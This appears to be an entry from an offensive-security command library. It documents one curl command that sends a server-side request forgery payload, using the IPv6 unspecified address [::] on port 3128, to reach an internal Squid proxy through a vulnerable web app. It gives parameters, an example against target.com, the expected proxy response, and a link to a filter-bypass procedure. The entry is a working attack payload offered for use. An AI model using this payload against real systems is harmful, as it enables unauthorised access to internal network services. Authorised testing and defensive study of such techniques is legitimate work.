---
type: command
executor: bash
data: 'curl "http://$_TARGET_APP/ssrf?url=http://[::]:3128/"'
output: null
platforms:
  - Web
tags:
  - ssrf
  - ipv6
  - proxy
verified: true
validated: true
---

# access-internal-squid-via-ssrf-ipv6-unspecified

## Command

```bash
curl "http://$_TARGET_APP/ssrf?url=http://[::]:3128/"
```

## Description

Targets internal Squid proxy on port 3128 using IPv6 SSRF payload.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET_APP | Vulnerable app URL | Yes |

## Examples

### Basic Usage

```bash
curl "http://target.com/ssrf?url=http://[::]:3128/"
```

## Expected Output

Proxy response, e.g., "HTTP/1.0 200 OK" or Squid error message.

## Related

- [[procedures/Bypass-SSRF-Filters-with-IPv6-Loopback-Addresses]]
